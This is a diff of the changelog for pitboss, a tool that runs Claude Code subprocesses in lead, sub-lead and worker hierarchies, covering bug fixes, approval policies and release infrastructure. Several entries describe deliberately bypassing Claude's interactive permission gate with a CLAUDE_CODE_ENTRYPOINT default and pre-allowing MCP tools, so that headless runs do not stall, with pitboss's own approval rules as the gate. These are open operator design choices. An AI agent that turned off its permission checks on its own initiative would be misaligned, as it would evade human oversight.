-- **Sub-lead-spawned workers looked "unknown" to every downstream
-  lookup.** `handle_list_workers`, `handle_worker_status`, and
-  `wait_for_actor_internal` (the engine behind `wait_actor` /
-  `wait_for_worker`) all read `state.workers` — which under the
-  DispatchState → LayerState Deref resolves to the root layer's
-  workers map. Workers spawned by a sub-lead are registered in the
-  sub-lead's `LayerState.workers` via `target_layer.workers.write()`
-  in `handle_spawn_worker`, so a sub-lead calling `spawn_worker` got
-  back a valid task_id but the very next `wait_actor` on that id
-  returned `MCP error -32600: unknown actor_id: worker-...` and
-  `list_workers` returned `[]`. Silent depth-2 break since v0.6 —
-  sub-leads cannot manage their own workers. Fixed by introducing
-  `find_worker_across_layers` that scans root + every active
-  sub-lead layer, and routing all four handlers through it.
-  Confirmed via the depth-2 smoke test: before the fix, the sublead
-  got "unknown actor_id" on every wait; after, the wait completes
-  against the correct layer's worker record.
-- **Workers spawned with an empty env — `[defaults.env]` never
-  reached them.** `run_worker` and `spawn_resume_worker` both built
-  their `SpawnCmd` with `env: Default::default()`, so manifest-level
-  env vars (e.g. `WORK_DIR`, `ARTIFACTS_DIR`) propagated lead → sublead
-  (after prior fixes) but dead-ended before hitting workers. Observable
-  symptom: a sublead asking a worker to write `"$WORK_DIR/file.md"`
-  resolved `$WORK_DIR` to empty and the worker's bash either errored
-  or wrote to an unexpected path. Same bug class as the sublead-env
-  regression; third occurrence of "env stops at layer N". Fixed by
-  re-using `compose_sublead_env` at both worker-spawn paths, seeding
-  from `layer.manifest.lead.env` (initial) / `state.manifest.lead.env`
-  (resume) so the same lead → sublead → worker env chain holds across
-  depth-2, pause/continue, and reprompt. `SpawnWorkerArgs` still has
-  no per-spawn `env` override — operator env stays at the manifest
-  level for now.
-- **Sub-leads couldn't read project files without a permission
-  prompt.** Every sub-lead's claude subprocess started with
-  `cwd = ~/.local/share/pitboss/runs/<run_id>/`, which put the operator's
-  project directory (and anything `[defaults.env]` pointed into it)
-  outside claude's cwd-rooted trust zone. Claude would prompt on every
-  read, and under `-p` headless mode the prompt is unanswerable —
-  sub-leads effectively couldn't see any project artifact. The v0.6
-  author's own comment flagged this as a placeholder ("sub-leads don't
-  get separate worktrees in v0.6 — revisit in future"). Fixed: sub-lead
-  cwd is now the root lead's manifest `directory` (not `lead_cwd` —
-  when the lead uses a worktree, sub-leads still cwd the canonical
-  project dir so they can't lose cwd mid-flight if the lead's worktree
-  is cleaned up, and they see committed project state rather than the
-  lead's in-flight edits). Applied at both initial spawn and the
-  kill+resume path.
-- **Sub-lead MCP bridge was silently broken since v0.6.** The CLI
-  `ActorRoleArg` enum defined only `Lead` and `Worker`, but
-  `build_sublead_mcp_config` wrote `--actor-role sublead` into every
-  sub-lead's mcp-config. When claude spawned the mcp-bridge subprocess
-  to talk to pitboss, clap rejected the argv (`invalid value 'sublead'
-  for '--actor-role'`), the bridge exited immediately, and claude
-  reported `pitboss: failed` in its init event — with zero pitboss MCP
-  tools registered for the sub-lead. Observable symptom: sub-leads
-  can't `kv_get`, `spawn_worker`, or any other pitboss tool; the lead
-  looks fine. The server-side `ALLOWED_ROLES` had always accepted
-  `sublead` (and `root_lead`); only the client-side argv parser was
-  rejecting valid traffic pitboss itself was emitting. Added `Sublead`
-  and `RootLead` variants, switched clap `rename_all` to `snake_case`
-  so `RootLead → root_lead`, and added a regression test pinning every
-  ActorRole variant to its server-side token.
-- **Root-lead `--allowedTools` was missing four real MCP tools, causing
-  silent orchestration stalls.** `PITBOSS_MCP_TOOLS` omitted
-  `wait_actor`, `propose_plan`, `run_lease_acquire`, and
-  `run_lease_release` — all registered by the MCP server since v0.5/v0.6
-  but never added to the CLI allowlist. In headless dispatches this
-  manifested as a lead that successfully spawned subleads, then tripped
-  Claude's own permission gate on the very next call (`"Claude requested
-  permissions to use mcp__pitboss__wait_actor, but you haven't granted
-  it yet"`) and quietly exited. The interactive prompt cannot be
-  answered under `-p`, so the tool call fails and the orchestration
-  plan collapses. `SUBLEAD_MCP_TOOLS` had the same gaps. Fixed by
-  pre-allowing the missing tools on both root and sublead paths. Also
-  removed a phantom `wait_for_sublead` allowlist entry that was
-  masking the `wait_actor` omission during review (no such server tool
-  exists — sublead waits go through `wait_actor` / `wait_for_worker`).
-- **`[defaults.env]` did not propagate from the lead to subleads.**
-  Once PR #45 plumbed `[defaults.env]` through to the root lead, the
-  env still stopped there: `spawn_sublead`'s sublead env came solely
-  from the `env:` param of the MCP tool call, so project-level path
-  blocks (e.g. `WORK_DIR`, `ARTIFACTS_DIR`) defined in `[defaults.env]`
-  were invisible to subleads unless the lead remembered to re-pass them
-  on every `spawn_sublead`. Fixed by seeding sublead env from the root
-  lead's resolved env (which already carries the merged `[defaults.env]`
-  + `[lead.env]`) before layering the operator's per-spawn env on top.
-  Precedence: lead env → operator env → pitboss defaults (gap-fill).
-  Applies to both the initial spawn and the kill+resume path used when
-  a synthetic reprompt arrives.
-- **`pitboss validate` now catches the `allow_subleads = true` +
-  no-fallback footgun.** A manifest with `[lead] allow_subleads = true`
-  but no `[lead.sublead_defaults]` would pass `validate` and then
-  blow up at the first `spawn_sublead` call from the lead with
-  `"budget_usd required when read_down=false"`. Validation is a pure
-  function of manifest shape — it should have caught this. Now does:
-  rejects with an actionable error pointing at the two fix paths
-  (`read_down = true` for SharedPool default, or `budget_usd` +
-  `max_workers` for Owned default). Also closes a wider gap: the
-  single-table `[lead]` form was bypassing `validate()` entirely
-  (acceptable for git/dir checks where it uses CWD + sentinel id, not
-  acceptable for shape-only checks like this one). The shape-only
-  check now runs in both manifest-form paths.
+- Resolve 13 medium-severity bugs in control/dispatch/store/notify paths ([#89](https://github.com/SDS-Mode/pitboss/pull/89))
+- Evict stale queue entry when request_approval TTL fires ([#73](https://github.com/SDS-Mode/pitboss/pull/73))
+- Resolve 13 medium-severity bugs in dispatch/TUI/storage/notify paths ([#74](https://github.com/SDS-Mode/pitboss/pull/74))
+- Resolve 5 high-severity bugs in approval/session/TUI paths ([#71](https://github.com/SDS-Mode/pitboss/pull/71))
+- Isolate pitboss-spawned claude from operator ~/.claude/ plugins ([#48](https://github.com/SDS-Mode/pitboss/pull/48))
+- Cancel_run cascades to sub-lead layers + their workers ([#47](https://github.com/SDS-Mode/pitboss/pull/47))
+- Bubble classified API failures to parent + gate spawns ([#49](https://github.com/SDS-Mode/pitboss/pull/49))
+- Defaults.env plumbing + orchestration allowlist gaps ([#45](https://github.com/SDS-Mode/pitboss/pull/45))
+- Catch allow_subleads=true with no sublead_defaults fallback ([#44](https://github.com/SDS-Mode/pitboss/pull/44))
 
-### Docs
 
-- **`[[notification]]` field name correction** — documented as `type`
-  in AGENTS.md, `book/src/operator-guide/notifications.md`, and
-  `book/src/operator-guide/docker-compose.md`, but the actual struct
-  field (with no serde rename) is `kind`. An operator following the
-  docs verbatim would see `missing field 'kind'` from `pitboss
-  validate`. All examples in those three files now use `kind`, and
-  the notifications operator-guide page gains a callout noting that
-  `type = "slack"` will be rejected. Also documents the v0.7.1
-  security changes (`PITBOSS_`-prefixed env-var substitution, URL
-  scheme/host validation, Discord markdown escaping) that had
-  landed in code but weren't reflected in the notification page.
+### V0.8
+
+- Permission routing, approval TTL, policy editor, and status command ([#91](https://github.com/SDS-Mode/pitboss/pull/91))
+
 
 ## [0.7.0] — 2026-04-20
 
-The headless-mode hardening release. Closes the silent "7-second
-success" failure modes that an external operator hit running pitboss
-under another agent. Also ships the bundled-claude container variant,
-native multi-arch CI (no more QEMU), bundled AGENTS.md reference,
-GitHub Action bumps for Node 24 compatibility, and a security-review
-follow-up (run-global lease connection-drop cleanup).
+### Added
 
-Highlights:
-- **`ghcr.io/sds-mode/pitboss-with-claude`** — new multi-arch container
-  variant bundling a pinned Claude Code CLI. Run pitboss without
-  installing claude on the host; consume OAuth via a `~/.claude` mount.
-- **Path A permission default** — `CLAUDE_CODE_ENTRYPOINT=sdk-ts` auto-set
-  on every spawned claude subprocess. Eliminates silent sub-lead failures
-  where claude asked for permission from a non-existent operator and
-  exited cleanly with no output.
-- **Approval-driven terminal states** — `ApprovalRejected` and
-  `ApprovalTimedOut` distinguish "task exited because its approval was
-  denied" from a real `Success`. Previously both looked like Success.
-- **`spawn_sublead` gains `env` and `tools`** — sub-leads can now
-  receive per-spawn environment variables and allowlist overrides,
-  matching `spawn_worker`'s shape.
-- **Headless-dispatch warning** — stderr warning at startup when
-  approval gates would block without a TTY.
-- **`pitboss agents-md`** — prints the AGENTS.md reference document
-  bundled into the binary. Same content at
-  `/usr/share/doc/pitboss/AGENTS.md` in container images.
-- **CI elapsed time 62 min → 5 min** — native `ubuntu-24.04-arm`
-  runners with matrix + merge pipeline. No QEMU emulation.
+- Headless-mode hardening (lessons-learned fixes + Path A permission default) ([#40](https://github.com/SDS-Mode/pitboss/pull/40))
+- Bundle AGENTS.md into binary + container image ([#39](https://github.com/SDS-Mode/pitboss/pull/39))
+- Add pitboss-with-claude variant ([#37](https://github.com/SDS-Mode/pitboss/pull/37))
+
+
+### Fixed
+
+- Note_actor on run_lease_acquire/release + rmcp-driven cleanup test
+- Correct ApprovalCategory enum values to snake_case in TOML examples
+- Cookbook link in intro went to README.html (404)
+- Drop invalid multilingual field from book.toml
+- Re-track smoke scripts; narrow ignore to ketchup only
+- Close reconcile/lease race in run_global_lease_serializes_two_subleads
+
+
+## [0.6.0] — 2026-04-20
 
 ### Added
 
-- **Two new terminal statuses: `TaskStatus::ApprovalRejected` +
-  `TaskStatus::ApprovalTimedOut`** (and matching `SubleadOutcome`
-  variants) — tasks that exit because their last `request_approval` /
-  `propose_plan` returned `{approved: false}` (operator-rejected,
-  policy auto-rejected) are now classified distinctly from genuine
-  `Success`. Previously both looked like `Success` because the claude
-  subprocess exited 0. SQLite store + JSON wire format extended with
-  the two new strings; old records deserialize unchanged.
-  `ApprovalTimedOut` is reserved for queue-TTL fallback (defined and
-  ready to wire when the queue-TTL → response path lands).
-- **`spawn_sublead` MCP tool gains optional `env` and `tools`
-  parameters** — sub-leads can now receive per-spawn environment
-  variables and a `--allowedTools` override. Operator env layers over
-  pitboss defaults (`CLAUDE_CODE_ENTRYPOINT=sdk-ts` etc.); tools merge
-  with the standard sublead MCP toolset (de-duplicated). `mcp__pitboss__*`
-  tools are always present so the sub-lead can still orchestrate workers
-  regardless of override.
-- **Dispatch-time warning when approval gates would block headless
-  runs.** If stdout is not a TTY and the manifest has
-  `require_plan_approval = true`, `approval_policy = "block"` (or
-  unset), or any `[[approval_policy]]` rule with `action = "block"`,
-  pitboss prints a stderr warning listing each gate before any claude
-  subprocess launches. Silent on TTY (interactive operators have the
-  TUI to approve).
-- **`pitboss agents-md` subcommand** — prints the bundled AGENTS.md
-  reference document to stdout. The content is compiled into the binary
-  via `include_str!`, so agents orchestrating pitboss from installed
-  binaries, containers, or CI runners (anywhere the git repo isn't
-  reachable) get the same doc as reading `AGENTS.md` from the repo.
-  Container images also ship a copy at `/usr/share/doc/pitboss/AGENTS.md`
-  for shell-first discovery — both routes serve identical bytes.
-- **Container variant `pitboss-with-claude`**: a new multi-arch container image published at `ghcr.io/sds-mode/pitboss-with-claude` bundling pitboss + a pinned Claude Code CLI (`2.1.114`). Operators consume host OAuth via a bind-mount of `~/.claude`. See the [Using Claude in a container](book/src/operator-guide/using-claude-in-container.md) book page for auth setup, UID alignment (rootless podman: `--userns=keep-id`), SELinux caveats (`:z` on all bind mounts), and macOS fallbacks.
-- CI smoke-test job that verifies `claude --version`, `pitboss --version`, and the bundled ATTRIBUTION file on both architectures post-merge.
+- Extend kill-with-reason delivery to root-lead targets
+- Wire send_synthetic_reprompt to real kill+resume delivery
+- Implement spawn_sublead_session — real sub-lead subprocess lifecycle
+- Add sublead_spawn_args helper for v0.6 sub-lead spawning
+- Allow_subleads + caps + sublead_defaults
+- Approval_pending notification category
+- Non-modal approval list pane + reject-with-reason input
+- Grouped grid with collapsible sub-tree containers
+- Add EventEnvelope + sub-lead lifecycle events (Task 4.6)
+- Kill-with-reason cascades to parent lead
+- TTL watcher for pending approvals
+- Reject-with-reason on approval response
+- TOML approval policy matcher
+- Add rich fields to approval record (Task 4.1)
+- Auto-release run-global leases on actor termination
+- Add run_lease_acquire and run_lease_release tools
+- Add run-global LeaseRegistry
+- Per-layer KvStore + strict peer visibility
+- Reconcile sub-lead budget on termination
+- Cascade cancel from root to sub-trees
+- Enforce depth-2 cap on spawn_sublead
+- Implement spawn_sublead end-to-end
+- Add spawn_sublead tool stub
+- Accept sublead actor_role in bridge _meta injection
+- Add wait_actor as generalized wait_worker
+- Add ActorRole, ActorPath, ActorId types
 
-### Fixed
-
-- **Sub-lead claude subprocesses spawned with empty env** — previously
-  `spawn_sublead_session` constructed its `SpawnCmd` with `env:
-  Default::default()` (empty map). For headless dispatch this meant
-  sub-leads couldn't inherit `CLAUDE_CODE_ENTRYPOINT` even when the
-  operator set it via `[defaults.env]`. Now seeded with pitboss's own
-  defaults plus any operator env from the new `spawn_sublead` `env`
-  parameter. Closes the P0 half of lessons-learned items #1 and #6.
-- **Tasks that exited because their last approval was rejected showed
-  as `Success`** — the claude subprocess exited 0 (its work was simply
-  blocked by the rejection), and pitboss had no way to distinguish this
-  from a real success. New `ApprovalRejected` terminal status, plus a
-  per-actor `last_approval_response` map on `DispatchState`, plus a
-  reclassification check at every termination site (worker /
-  continue-worker / sublead / root lead) that flips Success →
-  ApprovalRejected when the actor's most recent approval (within 30s
-  of termination) returned negative. Sub-leads in headless dispatch
-  with `[[approval_policy]] action = "auto_reject"` rules will now
-  surface as `ApprovalRejected` in `summary.json` instead of misleading
-  Success. Closes lessons-learned item #3.
-- **Run-global leases leaked on connection drop when `run_lease_acquire`
-  was the only tool called on a connection.** `note_actor` was missing
-  from the `run_lease_acquire` and `run_lease_release` MCP handlers, so
-  the connection-drop cleanup hook had no actor id to release against.
-  Leases stayed held until the TTL elapsed; subsequent acquires from
-  new connections failed with "lease currently held by <dead-actor>".
-  Added `note_actor` to both handlers. Caught by a security-review-
-  driven integration test
-  (`run_global_lease_released_when_mcp_connection_drops`) that
-  exercises the full rmcp socket-close path.
 
 ### Changed
 
-- **Default `CLAUDE_CODE_ENTRYPOINT=sdk-ts` on every spawned claude
-  subprocess** (root lead, workers, sub-leads). Pitboss is the external
-  permission authority via `approval_policy` + `[[approval_policy]]`
-  rules + the TUI; claude's own interactive permission gate is bypassed
-  to prevent silent 7-second-success failures in headless dispatch where
-  no TTY is available to approve tool calls. Operators who want claude's
-  own gate back for a specific actor restore it by setting
-  `CLAUDE_CODE_ENTRYPOINT` to a non-`sdk-ts` value via `[defaults.env]`,
-  `[lead.env]`, `[[task]].env`, or the `env` field on `spawn_sublead`.
-  See `docs/superpowers/specs/2026-04-20-path-b-permission-prompt-routing-pin.md`
-  for the deferred alternative (route claude's gate through pitboss's
-  approval queue rather than bypassing).
-- **Container CI**: migrated from QEMU-emulated multi-arch builds to
-  native `ubuntu-latest` + `ubuntu-24.04-arm` runners with a matrix +
-  merge pipeline. Published `ghcr.io/sds-mode/pitboss` image contents
-  and tags are unchanged; build elapsed time drops from ~60 min to
-  ~5 min (12× faster). No user-facing behavior change.
+- Address review feedback on LayerState extraction
+- Extract LayerState from DispatchState
+- Address review feedback on actor types
 
-### Docs
-
-- **AGENTS.md: new "Headless mode" section** between "Invocation
-  patterns" and "Interpreting a run directory" — covers the v0.7
-  permission model (`CLAUDE_CODE_ENTRYPOINT=sdk-ts` default), approval
-  policy choices for unattended dispatch, the dispatch-time TTY warning,
-  the `require_plan_approval` footgun, the git-repo-required-for-
-  hierarchical-mode quirk, status reading without the TUI, the new
-  terminal-state classifications (including operator guidance for
-  `ApprovalRejected` debugging), the new `spawn_sublead` env/tools
-  parameters, and the offline access patterns (`pitboss agents-md` +
-  the container doc path).
-- **AGENTS.md**: added YAML frontmatter (`document`, `schema_version`,
-  `pitboss_version`, `audience`, `canonical_url`, `last_updated`) so
-  agents can filter for applicability without scanning the whole doc.
-- **`book/src/operator-guide/docker-compose.md`**: new operator-guide
-  page with four compose examples (one-shot headless, dispatch + TUI,
-  headless + Slack webhook, and a preview of the `pitboss-with-claude`
-  variant shape).
-- **`crates/pitboss-tui/README.md`**: refreshed to cover v0.5/v0.6 TUI
-  features (grouped grid for depth-2 runs, approval list pane, mouse
-  support, scroll cadence, plan-vs-action approval modals, reject-with-
-  reason, frozen/paused tile states).
-
-### Gotchas caught during development (operator-relevant)
-
-Notes for operators pulling the new `pitboss-with-claude` image —
-these are covered in depth on the [Using Claude in a container](book/src/operator-guide/using-claude-in-container.md)
-page and the compose examples:
-
-- **Rootless podman + `~/.claude` mount:** `--userns=keep-id` is
-  required. Without it, host UID 1000 maps to in-container UID 0
-  (fake root) and the bundled `pitboss` user can't read the mounted
-  `.credentials.json`. `-u "$(id -u):$(id -g)"` alone is insufficient
-  on rootless podman — it's only adequate under Docker or rootful
-  podman.
-- **SELinux `:z` on ALL bind mounts:** Fedora/RHEL/Rocky operators
-  need `:z` on every bind mount (manifest, run-state dir, `~/.claude`,
-  workspace repo). Missing `:z` on any one of them surfaces as a
-  cryptic `Permission denied (os error 13)` from pitboss at
-  manifest-read time.
-- **Manifest schema — `run_id` is auto-generated**, not an
-  operator-settable field. Place it inside `[run]` if you want to
-  pin a specific run-id, but typically omit it and let the
-  dispatcher assign one per invocation.
-
-### CI / infra bugs fixed during implementation
-
-- **Dockerfile `COPY --from=node /usr/local/bin/npm` dereferences
-  the symlink** and breaks npm's relative `require('../lib/cli.js')`.
-  Fix: COPY only the node binary + `node_modules/npm` tree, then
-  `ln -s` npm/npx into `/usr/local/bin/` manually.
-- **`chown -R ${NPM_CONFIG_PREFIX}` before `npm install -g`** only
-  affects the empty dir; files npm writes afterward stay root-owned.
-  Fix: run `chown -R` as the last step of the RUN block.
-- **GHA rejects `matrix.*` in job-level `if:` expressions.** The
-  workflow fails validation before any job starts. Fix: drop the
-  arm64-skip-on-PR optimization; arm64 hosted runners are free for
-  public repos and matrix cells parallelize, so PR wall-clock is
-  unchanged.
-
-## [0.6.0] — 2026-04-19
-
-The depth-2 sub-leads release. Lifts the depth=1 hierarchical invariant
-with a single new tier: a root lead may dynamically spawn sub-leads,
-each of which spawns workers. Workers remain terminal. The full design
-rationale is at `docs/superpowers/specs/2026-04-19-depth-2-sub-leads-design.md`
-(local-only per project convention).
-
-### Added
-
-- **`spawn_sublead` MCP tool** — root lead creates a new sub-tree at
-  runtime with its own envelope (`budget_usd`, `max_workers`,
-  `lead_timeout_secs`), seeded `/ref/*` (`initial_ref` snapshot), and
-  optional `read_down` for observability into the sub-tree. Returns
-  `sublead_id`. Available only when `[lead] allow_subleads = true`.
-  Restricted from sub-lead callers (depth-2 cap enforced at both the
-  MCP handler and the sub-lead's `--allowedTools` list).
-- **`wait_actor` MCP tool** — generalized lifecycle wait that accepts
-  any actor id (worker or sub-lead). Returns `ActorTerminalRecord`
-  (enum over `Worker(TaskRecord)` and `Sublead(SubleadTerminalRecord)`).
-  `wait_for_worker` retained as a back-compat alias.
-- **`run_lease_acquire` / `run_lease_release` MCP tools** — run-global
-  lease coordination via a dedicated `LeaseRegistry` on
-  `DispatchState`. Use for resources that span sub-trees (operator
-  filesystem, etc.); per-layer `/leases/*` remains for sub-tree-internal
-  coordination. Auto-released on actor termination.
-- **`cancel_worker(target, reason?)`** — optional `reason` parameter.
-  When supplied, a synthetic `[SYSTEM]` reprompt is delivered to the
-  killed actor's direct parent lead via kill+resume of the parent's
-  claude session. Routing is one-hop-up: kill a worker → its sub-lead
-  (or root) gets the reason; kill a sub-lead → root gets the reason.
-- **`[[approval_policy]]` manifest blocks** — operator-declared
-  deterministic rules over `actor` / `category` / `tool_name` /
-  `cost_over` with `auto_approve` / `auto_reject` / `block` actions.
-  First-match-wins. Evaluated in pure Rust before approvals reach the
-  operator queue. NOT LLM-evaluated.
-- **Reject-with-reason** — optional `reason: String` on approval
-  rejections; flows back through MCP to the requesting actor's session
-  so claude can adapt without a separate reprompt round-trip.
-- **Approval TTL + fallback** — `QueuedApproval` gains optional
-  `ttl_secs` and `fallback` (`auto_reject` / `auto_approve` / `block`).
-  Background watcher applies the fallback when an approval ages past
-  its TTL. Prevents unreachable operators from permanently stalling
-  the tree.
-- **`SubleadSpawned` / `SubleadTerminated` control-plane events** —
-  emitted from `spawn_sublead` and `reconcile_terminated_sublead`.
-  `EventEnvelope` wrapper adds `actor_path` (e.g., `"root→S1→W3"`) to
-  every event with `serde(skip_serializing_if = "ActorPath::is_empty")`
-  so v0.5 wire format is preserved when no sub-leads exist.
-- **`ApprovalPending` notification category** — fires when an approval
-  enqueues for operator action. Reuses existing webhook/Slack/Discord
-  sinks + LRU dedup. Operator opts in via `[notifications]` config.
-- **TUI grouped grid** — sub-trees render as collapsible containers
-  (header shows sublead_id, budget bar, worker count, approval badge,
-  read_down indicator). Tab cycles focus across containers; Enter on
-  header toggles expand/collapse.
-- **TUI approval list pane** — non-modal right-rail (30% width) shows
-  pending approvals as a queue. `'a'` focuses the pane; Up/Down
-  navigate; Enter opens the detail modal. Reject branch in the modal
-  accepts an optional reason string. Replaces the v0.5 single-modal
-  blocking flow that didn't scale to N concurrent sub-leads.
-- **Manifest fields on `[lead]`:** `allow_subleads` (bool, default
-  false; required to expose `spawn_sublead`), `max_subleads` (cap on
-  total sub-leads), `max_sublead_budget_usd` (cap on per-sub-lead
-  envelope), `max_workers_across_tree` (cap on total live workers
-  including sub-tree workers).
-- **`[lead.sublead_defaults]` block** — optional defaults for
-  `budget_usd` / `max_workers` / `lead_timeout_secs` / `read_down`
-  inherited by `spawn_sublead` calls that omit those parameters.
-  Temporal-inspired ergonomic touch.
-- **Dogfood test suite** under `examples/dogfood/` — six fake-claude
-  spotlights covering isolation, cascade-cancel, lease contention,
-  policy matcher, envelope caps, and a smoke; three real-claude
-  smokes (env-var gated) for spawn_sublead invocation, kill-with-
-  reason, and reject-with-reason. Each spotlight is both a runnable
-  shell-script demo and an automated regression test.
-
-### Changed
-
-- **`DispatchState` is now a thin wrapper** around `Arc<LayerState>`
-  for the root layer plus a `RwLock<HashMap<SubleadId, Arc<LayerState>>>`
-  for sub-tree layers. Internal-only refactor: existing depth-1
-  callsites are unchanged via `Deref<Target = LayerState>` (with a
-  CAUTION doc block explaining the Phase 4+ footgun for handlers
-  that need to route by caller). `LayerState` carries all per-layer
-  state (workers, budget, kv_store, approval queue, etc.).
-- **Strict tree authz default** — sub-trees are opaque to root
-  unless `read_down = true` is passed at `spawn_sublead` time.
-  Strict peer visibility uniformly: at any layer, `/peer/<X>` is
-  readable only by X itself, that layer's lead, or the operator
-  via TUI.
-- **Budget envelope mode by default** — `spawn_sublead` requires
-  explicit `budget_usd` and `max_workers` unless `read_down = true`,
-  in which case `None` for either falls through to root's pool
-  (shared-pool mode). Unspent envelope returns to root's reservable
-  pool on sub-lead termination.
-- **Two-phase drain cascade** — root cancel cascades depth-first to
-  every sub-tree's `cancel_token` and every sub-tree worker's cancel
-  token. Sub-leads spawned mid-drain are caught by a spawn-time
-  `is_draining()` check (closes the race window the watcher alone
-  couldn't cover).
-- **Rich approval records** — `PendingApproval` carries
-  `requesting_actor_id`, `actor_path`, `blocks` (downstream wait
-  set), `created_at`, `ttl_secs`, `fallback`, `category`. Defaults
-  preserve v0.5 semantics when callers don't populate.
-- **`request_approval` accepts `tool_name` and `cost_estimate`
-  hints** — optional fields a lead can populate so policy rules
-  matching on `tool_name` / `cost_over` can fire.
 
 ### Fixed
 
-- **`wait_actor` works on sub-lead actor ids.** v0.6 RC introduced
-  the `wait_actor` generalization but the implementation only checked
-  `state.workers`; sub-lead ids returned `unknown actor_id`. Added
-  `sublead_results` map on `DispatchState` populated by
-  `reconcile_terminated_sublead`, which also fires `done_tx` so
-  waiters unblock. `wait_actor` now returns `ActorTerminalRecord`
-  enum; back-compat `wait_for_worker` unwraps the `Worker` variant.
+- Route spawn_worker into caller's layer based on _meta.actor_role
+- Wait_actor now works on sub-lead actor ids
+- Preserve cancel_worker task_id parameter for wire back-compat
+- Correct actor_path for sub-lead approval requests
+- Close kv_wait peer-visibility hole + remove try_read silent fallthrough
+- Wire original_reservation_usd through LayerState end-to-end
+- Cascade-cancel covers sub-leads spawned during drain
+- Allow explicit _meta in call_tool to override connection default
+- Root budget guard + reservation rollback in spawn_sublead
+- Inject_meta writes to params.arguments._meta to match wire path
 
-### Removed
-
-Nothing removed. v0.5 manifests, MCP callers, control-plane clients,
-and TUI sessions all behave identically when `allow_subleads` is
-absent (default false).
-
-### Deferment notes
-
-- `spawn_sublead_session` now spawns real Claude subprocesses for
-  sub-leads with full lifecycle (Cancel/Timeout/Error outcome
-  classification, TaskRecord persistence, budget reconciliation,
-  reprompt-loop kill+resume). End-to-end depth-2 dispatch with real
-  claude works.
-- Some Phase 4-era tightening (e.g., per-sub-tree runners that own
-  their workers' cancellation rather than the watcher cascading
-  directly) deferred to v0.7+ — current implementation works but
-  inverts ownership in a way the spec notes for future cleanup.
-
-### Test gate
-
-455 → 536 tests, 0 failures, 3 `#[ignore]`'d real-claude smokes
-(env-var gated). `cargo fmt --check` + `cargo clippy --workspace
---all-targets -- -D warnings` clean.
-
-## [0.5.5] — 2026-04-19
-
-### Fixed
-
-- **Unblocked Homebrew formula push to the tap repo.** Two changes
-  together are required:
-  1. Manually removed `persist-credentials: false` from the
-     `actions/checkout@v4` step for the tap repo in
-     `.github/workflows/release.yml` (the `publish-homebrew-formula`
-     job). The cargo-dist 0.28.7-generated default had the flag,
-     which tells `actions/checkout` *not* to save the passed token
-     into git config — meaning the subsequent `git push` had no
-     credential and fell through to interactive prompting (fails in
-     CI with "could not read Username for 'https://github.com'",
-     exit 128). Removing the flag persists the `HOMEBREW_TAP_TOKEN`
-     for the push.
-  2. Added `allow-dirty = ["ci"]` to `[dist]` in
-     `dist-workspace.toml`. cargo-dist's `dist host` step performs a
-     consistency check that the generated CI workflow matches what
-     it would regenerate; any manual edit fails this check with
-     "run 'dist init' to update the file". `allow-dirty = ["ci"]`
-     tells cargo-dist to accept the divergence.
-  
-  v0.5.3 built and released to GitHub Releases successfully but
-  never reached the tap. v0.5.4 tried the workflow edit alone and
-  was blocked at the `plan` step by the consistency check. v0.5.5
-  is the first version the `SDS-Mode/homebrew-pitboss` tap holds.
-  An upstream issue with cargo-dist for the `persist-credentials`
-  default is a followup.
-
-## [0.5.4] — 2026-04-19 [YANKED]
-
-Attempted to land the Homebrew-push workflow fix alone, but
-cargo-dist's `dist host` rejected the manually-edited workflow with
-its consistency check before `plan` could complete. No artifacts
-published. Superseded by 0.5.5 which pairs the workflow fix with
-`allow-dirty = ["ci"]` in cargo-dist config.
 
 ## [0.5.3] — 2026-04-19
 
 ### Fixed
 
-- **Unblocked release pipeline on aarch64 targets.** Two related build
-  fixes that together unblock both the cargo-dist aarch64-linux
-  cross-compile and the multi-arch container build:
-  1. `git2` dependency switched to `default-features = false, features = ["vendored-libgit2"]`,
-     disabling the HTTPS + SSH features that pulled in OpenSSL and
-     libssh2 transitively. pitboss's git2 usage is local-only (worktree
-     management, repo discovery, branch enumeration), so dropping these
-     is safe. Eliminates the OpenSSL sysroot requirement for
-     aarch64-linux cross-compile *and* the perl requirement in the slim
-     container builder.
-  2. `dist-workspace.toml` grows a `[dist.github-custom-runners]` block
-     pinning `aarch64-apple-darwin` to `macos-14` (native Apple Silicon)
-     instead of cross-compiling from `macos-13` (Intel). Faster native
-     build, shorter queue times, and dodges the ~2h public `macos-13`
-     runner queue anomaly observed during v0.5.2 validation.
+- Deflake freeze_then_resume_flips_proc_state ([#28](https://github.com/SDS-Mode/pitboss/pull/28))
 
-### Changed
 
-- **Release infrastructure migrated to [`cargo-dist`][cargo-dist].** The
-  hand-rolled `release.yml` matrix is replaced with a
-  `dist-workspace.toml` config + auto-generated workflow. Produces
-  `curl | sh` shell installers, Homebrew formulae (published to the
-  [`SDS-Mode/homebrew-pitboss`][tap] tap on every release), and
-  `tar.xz` tarballs with SHA-256 checksums. Target matrix adds
-  `aarch64-unknown-linux-gnu` alongside `x86_64-unknown-linux-gnu` and
-  `aarch64-apple-darwin` (the latter pinned to native M1 runners).
-  Requires a `HOMEBREW_TAP_TOKEN` repo secret + the tap repo to be
-  created before the `publish-homebrew-formula` job will succeed; other
-  release jobs (tarballs, installers) work without it.
-- **Added `description` / `repository` / `homepage` metadata to all
-  workspace crates** so the published artifacts (and future
-  `cargo publish` runs) carry proper provenance.
+### Infra
 
-### Added
+- Migrate to cargo-dist + add GHCR container image ([#29](https://github.com/SDS-Mode/pitboss/pull/29))
 
-- **Container image.** `Dockerfile` + `.github/workflows/container.yml`
-  publish multi-arch images (`linux/amd64` + `linux/arm64`) to
-  `ghcr.io/sds-mode/pitboss` on every push to `main` and every
-  `v*` tag. Debian-slim runtime with `git` and `ca-certificates`
-  preinstalled; ~212 MB uncompressed. Claude binary is not bundled —
-  mount it from the host or layer it in.
-- **Deflaked `freeze_then_resume_flips_proc_state`** — test now polls
-  `/proc/<pid>/status` for the expected `State:` transition instead of
-  racing a fixed sleep, eliminating intermittent CI failures on loaded
-  runners (#28).
-
-[cargo-dist]: https://github.com/astral-sh/cargo-dist
-[tap]: https://github.com/SDS-Mode/homebrew-pitboss
-
-## [0.5.2] — 2026-04-19 [YANKED]
-
-Release pipeline stalled on the `aarch64-apple-darwin` macOS runner
-queue (~2h wait on GitHub's public `macos-13` pool with no runner
-assignment) before the build job could start. No artifacts published.
-Superseded by 0.5.3, which pins the darwin job to native M1 runners
-(`macos-14`) and replaces the `vendored-openssl` fix with a cleaner
-`default-features = false` change on `git2` that removes the need for
-OpenSSL at all.
-
-## [0.5.1] — 2026-04-19 [YANKED]
-
-Release pipeline failed on `aarch64-unknown-linux-gnu` cross-compile
